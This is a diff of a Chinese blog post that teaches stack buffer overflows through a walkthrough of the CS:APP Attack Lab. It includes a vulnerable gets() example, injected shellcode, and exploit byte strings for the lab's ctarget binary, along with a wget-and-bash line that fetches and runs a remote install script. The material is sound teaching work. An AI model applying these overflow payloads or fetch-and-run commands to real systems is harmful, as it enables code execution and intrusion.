 <p>②将调用函数的栈帧栈底地址入栈，即将bp寄存器的值压入调用栈中</p>
 <p><code>push rbp</code></p>
 <p>③建立新的栈帧，将被调函数的栈帧栈底地址放入bp寄存器中</p>
 <p><code>mov rbp,rsp</code></p>
 <p>函数调用完成后要销毁函数调用栈，就相对容易的多：</p>
 <p><code>pop rbp</code></p>
-<p>再把main函数、f函数的源程序和汇编指令映射起来：</p>
+<p>再把<code>main()</code>函数、<code>f()</code>函数的源程序和汇编指令映射起来：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">disassemble /m main</span><br></pre></td></tr></table></figure>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; disassemble /m main</span><br><span class="line">Dump of assembler code for function main:</span><br><span class="line">5	int main()&#123;</span><br><span class="line">   0x0000000000001134 &lt;+0&gt;:	endbr64 </span><br><span class="line">   0x0000000000001138 &lt;+4&gt;:	push   rbp</span><br><span class="line">   0x0000000000001139 &lt;+5&gt;:	mov    rbp,rsp</span><br><span class="line"></span><br><span class="line">6	    f();</span><br><span class="line">   0x000000000000113c &lt;+8&gt;:	mov    eax,0x0</span><br><span class="line">   0x0000000000001141 &lt;+13&gt;:	call   0x1129 &lt;f&gt;</span><br><span class="line"></span><br><span class="line">7	    return 0 ;</span><br><span class="line">   0x0000000000001146 &lt;+18&gt;:	mov    eax,0x0</span><br><span class="line"></span><br><span class="line">8	&#125;</span><br><span class="line">   0x000000000000114b &lt;+23&gt;:	pop    rbp</span><br><span class="line">   0x000000000000114c &lt;+24&gt;:	ret    </span><br><span class="line"></span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">disassemble /m f</span><br></pre></td></tr></table></figure>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; disassemble /m f</span><br><span class="line">Dump of assembler code for function f:</span><br><span class="line">2	void f()&#123;</span><br><span class="line">   0x0000000000001129 &lt;+0&gt;:	endbr64 </span><br><span class="line">   0x000000000000112d &lt;+4&gt;:	push   rbp</span><br><span class="line">   0x000000000000112e &lt;+5&gt;:	mov    rbp,rsp</span><br><span class="line"></span><br><span class="line">3	</span><br><span class="line">4	&#125;</span><br><span class="line">   0x0000000000001131 &lt;+8&gt;:	nop</span><br><span class="line">   0x0000000000001132 &lt;+9&gt;:	pop    rbp</span><br><span class="line">   0x0000000000001133 &lt;+10&gt;:	ret    </span><br><span class="line"></span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure>
 <h3 id="（5）gets-函数"><a href="#（5）gets-函数" class="headerlink" title="（5）gets()函数"></a>（5）gets()函数</h3><p>函数声明</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> *<span class="title function_">gets</span><span class="params">(<span class="type">char</span>*str)</span></span><br></pre></td></tr></table></figure>
-<p>gets() 函数的功能是从<strong>输入缓冲区</strong>中读取一个字符串存储到<strong>字符指针变量 str</strong> 所指向的内存空间.</p>
+<p><code>gets()</code>函数的功能是从<strong>输入缓冲区</strong>中读取一个字符串存储到<strong>字符指针变量 str</strong> 所指向的内存空间.</p>
 <p>我们在linux环境下编写如下代码</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//111.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc,<span class="type">char</span>**argv)</span>&#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">10</span>] ;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Please input something\n&quot;</span>);</span><br><span class="line">    gets(buf);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,buf);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span> ;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>编译时会弹出warning👇</p>
@@ -422,46 +435,48 @@
 <p>栈溢出的有以下常见利用方式：</p>
 <p>·代码注入</p>
 <p>·ROP(返回导向编程)</p>
-<p>·ret2libc</p>
 <h3 id="实验环境与概述"><a href="#实验环境与概述" class="headerlink" title="实验环境与概述"></a>实验环境与概述</h3><p>本文所用实验：$CS:APP—Lab3—The Attack Lab$</p>
 <p>环境基础：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">~ » neofetch                                                        lbh@nexusvm</span><br><span class="line">            .-/+oossssoo+/-.               lbh@nexusvm </span><br><span class="line">        `:+ssssssssssssssssss+:`           ----------- </span><br><span class="line">      -+ssssssssssssssssssyyssss+-         OS: Ubuntu 20.04.5 LTS x86_64 </span><br><span class="line">    .ossssssssssssssssssdMMMNysssso.       Host: VMware Virtual Platform None </span><br><span class="line">   /ssssssssssshdmmNNmmyNMMMMhssssss/      Kernel: 5.15.0-48-generic </span><br><span class="line">  +ssssssssshmydMMMMMMMNddddyssssssss+     Uptime: 5 hours, 37 mins </span><br><span class="line"> /sssssssshNMMMyhhyyyyhmNMMMNhssssssss/    Packages: 2236 (dpkg), 9 (snap) </span><br><span class="line">.ssssssssdMMMNhsssssssssshNMMMdssssssss.   Shell: zsh 5.8 </span><br><span class="line">+sssshhhyNMMNyssssssssssssyNMMMysssssss+   Resolution: 1914x974 </span><br><span class="line">ossyNMMMNyMMhsssssssssssssshmmmhssssssso   DE: GNOME </span><br><span class="line">ossyNMMMNyMMhsssssssssssssshmmmhssssssso   WM: Mutter </span><br><span class="line">+sssshhhyNMMNyssssssssssssyNMMMysssssss+   WM Theme: Adwaita </span><br><span class="line">.ssssssssdMMMNhsssssssssshNMMMdssssssss.   Theme: Orchis-Red-Dark-Compact [GTK2 </span><br><span class="line"> /sssssssshNMMMyhhyyyyhdNMMMNhssssssss/    Icons: candy-icons [GTK2/3] </span><br><span class="line">  +sssssssssdmydMMMMMMMMddddyssssssss+     Terminal: gnome-terminal </span><br><span class="line">   /ssssssssssshdmNNNNmyNMMMMhssssss/      CPU: AMD Ryzen 7 4800H with Radeon G </span><br><span class="line">    .ossssssssssssssssssdMMMNysssso.       GPU: 00:0f.0 VMware SVGA II Adapter </span><br><span class="line">      -+sssssssssssssssssyyyssss+-         </span><br><span class="line">        `:+ssssssssssssssssss+:`</span><br><span class="line">            .-/+oossssoo+/-.                   </span><br></pre></td></tr></table></figure>
-<p>获取AttackLab3的实验材料：</p>
-<p>首先新建一个目录lab3attacklab，然后在终端执行以下命令：</p>
+<p>获取<code>AttackLab3</code>的实验材料：</p>
+<p>首先新建一个目录<code>lab3attacklab</code>，然后在终端执行以下命令：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https://gitee.com/lin-xi-269/csapplab/raw/origin/lab3attacklab/install.sh &amp;&amp; bash install.sh</span><br></pre></td></tr></table></figure>
 <p>然后里面的<code>target1</code>就是我们的工作目录。</p>
-<p><img src="/2022/10/04/%E6%A0%88%E6%BA%A2%E5%87%BA/tar1.png" alt></p>
+<p><img src="/2022/10/13/%E6%A0%88%E6%BA%A2%E5%87%BA/tar1.png" alt></p>
 <p>实验整体概况：</p>
-<p><img src="/2022/10/04/%E6%A0%88%E6%BA%A2%E5%87%BA/sygk.png" alt></p>
+<p><img src="/2022/10/13/%E6%A0%88%E6%BA%A2%E5%87%BA/sygk.png" style="zoom:150%;"></p>
 <p><code>target1</code>有这些内容：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">target1/README.txt    #A file describing the contents of the directory</span><br><span class="line">target1/ctarget       #An executable program vulnerable to code-injection attacks</span><br><span class="line">target1/rtarget       #An executable program vulnerable to return-oriented-programming attacks</span><br><span class="line">target1/farm.c        #The source code of your target’s “gadget farm,” which you will use in generating return-oriented</span><br><span class="line">programming attacks.</span><br><span class="line">target1/cookie.txt    #An 8-digit hex code that you will use as a unique identifier in your attacks</span><br><span class="line">target1/hex2raw       #A utility to generate attack strings</span><br></pre></td></tr></table></figure>
 <h3 id="Target-Programs"><a href="#Target-Programs" class="headerlink" title="Target Programs"></a>Target Programs</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="title function_">getbuf</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">char</span> buf[BUFFER_SIZE];</span><br><span class="line">Gets(buf);</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p><code>Gets()</code>函数不执行越界检查，会导致栈溢出</p>
 <h3 id="Ctarget-and-Rtarget执行参数"><a href="#Ctarget-and-Rtarget执行参数" class="headerlink" title="Ctarget and Rtarget执行参数"></a>Ctarget and Rtarget执行参数</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-h:Print list of possible command line arguments</span><br><span class="line">-q:Don’t send results to the grading server</span><br><span class="line">-i FILE:Supply input from a file, rather than from standard input</span><br></pre></td></tr></table></figure>
-<p>我们从level1到level5依次进行实验👇</p>
-<h3 id="Part1-Code-Injection"><a href="#Part1-Code-Injection" class="headerlink" title="Part1 Code Injection"></a>Part1 Code Injection</h3><h4 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h4><p>最基础的栈溢出：给了一个<code>test()</code>函数和<code>touch1()</code>函数，要求执行完<code>test()</code>后跳转到<code>touch1()</code>函数并执行。</p>
+<p>我们从<code>level1</code>到<code>level5</code>依次进行实验👇</p>
+<h3 id="Part1-Code-Injection"><a href="#Part1-Code-Injection" class="headerlink" title="Part1 Code Injection"></a>Part1 Code Injection</h3><p>首先<code>checksec ctarget</code></p>
+<p><img src="/2022/10/13/%E6%A0%88%E6%BA%A2%E5%87%BA/chc.png" style="zoom:80%;"></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Arch:程序架构信息,本机是amd64位程序</span><br><span class="line">RELRO:部分RELRO容易受到攻击</span><br><span class="line">Stack:栈溢出金丝雀保护</span><br><span class="line">NX:enabled表示开启NX保护,即栈中数据没有执行权限</span><br><span class="line">PIE(Position-Independent Executable，位置无关可执行文件):开启后，在编译时将程序编译为位置无关,程序运行时各个段（如代码但等）加载的虚拟地址也是在装载时才确定</span><br><span class="line">FORTIFY:由GCC实现的源码级别的保护机制，其功能是在编译的时候，检查源码以避免潜在的缓冲区溢出等错误。加了这个保护之后，一些敏感函数如read,fgets,memcpy,printf等等可能导致漏洞出现的函数会替换成__read_chk,__fgets_chk等。</span><br></pre></td></tr></table></figure>
+<h4 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h4><p>最基础的栈溢出：给了一个<code>test()</code>函数和<code>touch1()</code>函数，要求执行完<code>test()</code>后跳转到<code>touch1()</code>函数并执行。</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">test</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> val;</span><br><span class="line">val = getbuf();</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;No exploit.Getbuf returned 0x%x\n&quot;</span>, val);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">touch1</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">vlevel = <span class="number">1</span>;</span><br><span class="line"><span class="comment">/* Part of validation protocol */</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Touch1!: You called touch1()\n&quot;</span>);</span><br><span class="line">validate(<span class="number">1</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>我们首先对<code>ctarget</code>这个ELF（linux环境下的可执行文件缩写，<strong>E</strong>xecutable and <strong>L</strong>inkable <strong>F</strong>ile）进行反汇编得到汇编代码，存到<code>ctarget.txt</code>文档里：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">objdump -d ctarget &gt; ctarget.txt</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/10/04/%E6%A0%88%E6%BA%A2%E5%87%BA/ctarget1.png" alt></p>
+<p><img src="/2022/10/13/%E6%A0%88%E6%BA%A2%E5%87%BA/ctarget1.png" style="zoom: 50%;"></p>
 <p>查找<code>test()</code>函数,<code>getbuf()</code>函数,<code>touch1()</code>函数有：</p>
-<p><img src="/2022/10/04/%E6%A0%88%E6%BA%A2%E5%87%BA/test.png" alt></p>
-<p><img src="/2022/10/04/%E6%A0%88%E6%BA%A2%E5%87%BA/getbuf.png" alt></p>
-<p><img src="/2022/10/04/%E6%A0%88%E6%BA%A2%E5%87%BA/touch1.png" alt></p>
+<p><img src="/2022/10/13/%E6%A0%88%E6%BA%A2%E5%87%BA/test.png" style="zoom: 48.8%;"></p>
+<p><img src="/2022/10/13/%E6%A0%88%E6%BA%A2%E5%87%BA/getbuf.png" style="zoom: 50%;"></p>
+<p><img src="/2022/10/13/%E6%A0%88%E6%BA%A2%E5%87%BA/touch1.png" style="zoom: 48%;"></p>
 <p>我们下面开始分析：</p>
 <p>①调用<code>test()</code>函数，<code>test</code>返回地址和<code>rbp</code>入栈（图中为了方便起见只花了<code>test</code>的<code>rbp</code>），<code>rsp</code>指向栈里第一个单元</p>
 <p>②<code>sub $08x,%rsp</code>定义<code>test</code>函数调用栈的大小，8个内存单元</p>
 <p>③调用<code>getbuf()</code>函数，相当于<code>push 0x401976</code>后跳转到<code>getbuf()</code>函数</p>
 <p>④<code>sub $28x,%rsp</code>定义<code>getbuf()</code>中缓冲区的BUFFERSIZE，十六进制转十进制是40个内存单元，存储<code>char</code>型变量。我们可以画出当前的函数调用栈，如图：</p>
-<p><img src="/2022/10/04/%E6%A0%88%E6%BA%A2%E5%87%BA/l1s.jpg" style="zoom:50%;"></p>
-<p>无论我们输入什么，最后<code>getbuf()</code>肯定是要出栈的，出栈时要<code>ret</code>，<code>ret</code>指令的底层原理是：将栈中的内容弹出到<code>rip</code>中，然后程序从<code>rip</code>中存储的地址开始执行，所以我们的目标现在很明确，要通过<code>gets()</code>函数对目前<code>rbp</code>指向的内存单元进行覆写，也就是在写完这40个缓冲区之后，在<code>getbuf()</code>的<code>rbp</code>地址处写入<code>touch1()</code>入口的内存地址。因为一个内存单元是64位，$8\times 2 \times 4 = 64bit$，所以要多写8个双16进制数。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">|+-------------+</span><br><span class="line">||  test - rbp |</span><br><span class="line">|+-------------+</span><br><span class="line">||     [<span class="number">7</span>]     | </span><br><span class="line">||     [<span class="number">6</span>]     | </span><br><span class="line">||    .....    | </span><br><span class="line">||     [<span class="number">0</span>]     |</span><br><span class="line">|+-------------+</span><br><span class="line">||   <span class="number">0x401976</span>  |&lt;====rbp(getbuf-rbp)</span><br><span class="line">|+-------------+</span><br><span class="line">||     [<span class="number">39</span>]    |</span><br><span class="line">||    ......   |</span><br><span class="line">V|     [<span class="number">0</span>]     |&lt;====rsp </span><br></pre></td></tr></table></figure>
+<p>无论我们输入什么，最后<code>getbuf()</code>肯定是要出栈的，出栈时要<code>ret</code>，<code>ret</code>指令的底层原理是：将栈中的内容弹出到<code>rip</code>中，然后程序从<code>rip</code>中存储的地址开始执行，所以我们的目标现在很明确，要通过<code>gets()</code>函数对目前<code>rbp</code>指向的内存单元进行覆写，也就是在写完这40个缓冲区之后，在<code>getbuf()</code>的<code>rbp</code>地址处写入<code>touch1()</code>入口的内存地址。因为一个内存单元是64位，$8\times 2 \times 4 = 64bit$，所以要多写8个机器码。</p>
 <p>将下面内容存入<code>1.txt</code>文档：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00 00 00</span><br><span class="line">C0 17 40 00 00 00 00 00</span><br></pre></td></tr></table></figure>
 <p>注意：x86_64存储方式是小端存储，写入时候要注意。</p>
 <p>然后执行：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./hex2raw &lt; 1.txt | ./ctarget -q</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/10/04/%E6%A0%88%E6%BA%A2%E5%87%BA/level1res.png" alt></p>
+<p><img src="/2022/10/13/%E6%A0%88%E6%BA%A2%E5%87%BA/level1res.png" style="zoom: 60%;"></p>
 <h4 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h4><p>和level1大同小异，不过不能照搬，实验的pdf给了如下提示：</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">• You will want to position a byte representation of the address of your injected code in such a way thatret instruction at the end of the code <span class="keyword">for</span> getbuf will transfer control to it.</span><br><span class="line">• Recall that the first argument to a function is passed in <span class="keyword">register</span> %rdi.</span><br><span class="line">• Your injected code should <span class="built_in">set</span> the <span class="keyword">register</span> to your cookie, and then use a ret instruction to transfer</span><br><span class="line">control to the first instruction in touch2.</span><br><span class="line">• Do not attempt to use jmp or call instructions in your exploit code. The encodings of destination addresses <span class="keyword">for</span> these instructions are difficult to formulate. Use ret instructions <span class="keyword">for</span> all transfers of control, even when you are not returning from a call.</span><br><span class="line">• See the discussion in Appendix B on how to use tools to generate the byte-level representations of instruction sequences.</span><br></pre></td></tr></table></figure>
 <p>实际上level2比level1多了两个内容：</p>
@@ -478,19 +493,19 @@
 <p>A:在<code>getbuf()</code>的rsp栈帧上，结合level1的分析可得：rsp$\to$rsp+0x27处是我们要注入的代码，rsp+0x28$\to$rsp+0x2f存放要跳转到的地址，这个地址就是rsp所指向的内存单元地址，所以我们的任务是要找到rsp的值。</p>
 <p>使用<code>pwndbg</code>，我们进入<code>ctarget</code>：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb ctarget</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/10/04/%E6%A0%88%E6%BA%A2%E5%87%BA/gdb01.png" alt></p>
+<p><img src="/2022/10/13/%E6%A0%88%E6%BA%A2%E5%87%BA/gdb01.png" style="zoom:50%;"></p>
 <p>然后我们在<code>getbuf()</code>处设置断点并查看：</p>
-<p><img src="/2022/10/04/%E6%A0%88%E6%BA%A2%E5%87%BA/b1.png" alt></p>
+<p><img src="/2022/10/13/%E6%A0%88%E6%BA%A2%E5%87%BA/b1.png" style="zoom:60%;"></p>
 <p>然后开始运行程序：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">r -q</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/10/04/%E6%A0%88%E6%BA%A2%E5%87%BA/gf01.png" alt></p>
+<p><img src="/2022/10/13/%E6%A0%88%E6%BA%A2%E5%87%BA/gf01.png" style="zoom:50%;"></p>
 <p>可以看到卡在<code>getbuf</code>这一处，没有开始执行，此时我们看一下此时<code>rsp</code>的值：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash"><span class="built_in">print</span> <span class="variable">$rsp</span></span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">1 = (void *) 0x5561dca0</span></span><br></pre></td></tr></table></figure>
 <p>下面我们单步执行完<code>getbuf()</code>函数，并看一下<code>rsp</code>的值：</p>
-<p><img src="/2022/10/04/%E6%A0%88%E6%BA%A2%E5%87%BA/gf02.png" alt></p>
+<p><img src="/2022/10/13/%E6%A0%88%E6%BA%A2%E5%87%BA/gf02.png" style="zoom:50%;"></p>
 <p>发现rsp寄存器的值是<code>0x5561dc78</code>，这一处就是我们要跳转到并进行代码注入的位置。</p>
 <p>我们注入的代码要解决两件事：1.传参；2.跳转到<code>touch2</code>函数的位置</p>
-<p><img src="/2022/10/04/%E6%A0%88%E6%BA%A2%E5%87%BA/touch2.png" alt></p>
+<p><img src="/2022/10/13/%E6%A0%88%E6%BA%A2%E5%87%BA/touch2.png" style="zoom:50%;"></p>
 <p>所以我们编写如下代码，保存为<code>2.s</code>文件</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov $0x59b997fa,%rdi</span><br><span class="line">push $0x4017ec </span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
 <p>注：使用push是受到pdf里面使用<code>ret</code>的启发，因为<code>ret</code>的本质是<code>pop rip</code>。</p>
@@ -498,13 +513,13 @@
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -c 2.s</span><br></pre></td></tr></table></figure>
 <p>生成了<code>2.o</code>目标文件，然后我们对目标文件进行链接</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">objdump -d 2.o &gt; 2.d</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/10/04/%E6%A0%88%E6%BA%A2%E5%87%BA/2d.png" alt></p>
+<p><img src="/2022/10/13/%E6%A0%88%E6%BA%A2%E5%87%BA/2d.png" style="zoom:60%;"></p>
 <p>我们一共要注入48个机器码，40个是代码，8个是rsp地址，其余任意，为便捷起见写为<code>00</code></p>
 <p>所以我们把要写的机器码存入<code>2.txt</code>文件：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">48 c7 c7 fa 97 b9 59 68</span><br><span class="line">ec 17 40 00 c3 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">78 dc 61 55 00 00 00 00</span><br></pre></td></tr></table></figure>
 <p>然后执行以下代码</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./hex2raw &lt; 2.txt | ./ctarget -q</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/10/04/%E6%A0%88%E6%BA%A2%E5%87%BA/level2res.png" alt></p>
+<p><img src="/2022/10/13/%E6%A0%88%E6%BA%A2%E5%87%BA/level2res.png" style="zoom:60%;"></p>
 <h4 id="3-level3"><a href="#3-level3" class="headerlink" title="3.level3"></a>3.level3</h4><p>这次的要求是注入代码后执行<code>touch3</code>函数而不返回<code>test</code>函数，并且传入的参数必须是字符串形式，实验的pdf也给出了一些advice:</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">• You will need to include a <span class="built_in">string</span> representation of your cookie in your exploit <span class="built_in">string</span>. The <span class="built_in">string</span> should consist of the eight hexadecimal <span class="title function_">digits</span> <span class="params">(ordered from most to least significant)</span> without a leading “0x.”</span><br><span class="line">• Recall that a <span class="built_in">string</span> is represented in C as a sequence of bytes followed by a byte with value 0. Type “man ascii” on any Linux machine to see the byte representations of the characters you need.</span><br><span class="line">• Your injected code should <span class="built_in">set</span> <span class="keyword">register</span> %rdi to the address of this <span class="built_in">string</span>.</span><br><span class="line">• When functions hexmatch and <span class="built_in">strncmp</span> are called, they push data onto the <span class="built_in">stack</span>, overwriting portions of memory that held the buffer used by getbuf. As a result, you will need to be careful where you place the <span class="built_in">string</span> representation of your cookie.</span><br></pre></td></tr></table></figure>
 <p>首先我们要做的，是把自己的<code>cookie</code>值转换为<code>ASCII</code>码并传入到<code>%rdi</code>中作为函数参数</p>
@@ -523,7 +538,7 @@
 <p>②还可以覆盖掉之前某一个函数的栈帧，这样一来地址确定而且不怕再被其它函数覆盖，因为我们的栈就是在<code>test()</code>函数的栈帧中，<code>test()</code>函数一直都没有返回，所以我们要把这个参数塞到<code>test()</code>函数的部分。</p>
 <p>好，既然已经明确要把参数塞到<code>test()</code>函数的部分，那就要找到<code>test()</code>函数栈帧的<code>%rsp</code>，和level2一样，分别在终端执行以下代码：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">gdb ctarget</span><br><span class="line">b test</span><br><span class="line">info breakpoints #注：这句可有可无，就是查看目前所有设置的断点的信息</span><br><span class="line">r -q #程序执行到test()函数之前</span><br><span class="line">print $rsp #查看当前rsp值</span><br><span class="line">stepi #步进执行</span><br><span class="line">print $rsp #查看当前rsp值，此时的值就是我们想要的</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/10/04/%E6%A0%88%E6%BA%A2%E5%87%BA/rsp03.png" alt></p>
+<p><img src="/2022/10/13/%E6%A0%88%E6%BA%A2%E5%87%BA/rsp03.png" style="zoom:60%;"></p>
 <p>那么注入代码的第一句是：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov $0x5561dca8 , %rdi</span><br></pre></td></tr></table></figure>
 <p>然后，此处思路同level2，既然我们要跳到<code>touch3</code>，那么我们就要传入<code>touch3</code>的入口地址然后返回，于是全部注入代码就是：</p>
@@ -531,7 +546,7 @@
 <p>我们将它命名为<code>3.s</code>，然后编译链接为<code>3.d</code>文件</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -c 3.s</span><br><span class="line">objdump 3.o &gt; 3.d</span><br></pre></td></tr></table></figure>
 <p>得到这些指令的16进制机器码：</p>
-<p><img src="/2022/10/04/%E6%A0%88%E6%BA%A2%E5%87%BA/l3jqm.png" alt></p>
+<p><img src="/2022/10/13/%E6%A0%88%E6%BA%A2%E5%87%BA/l3jqm.png" style="zoom:60%;"></p>
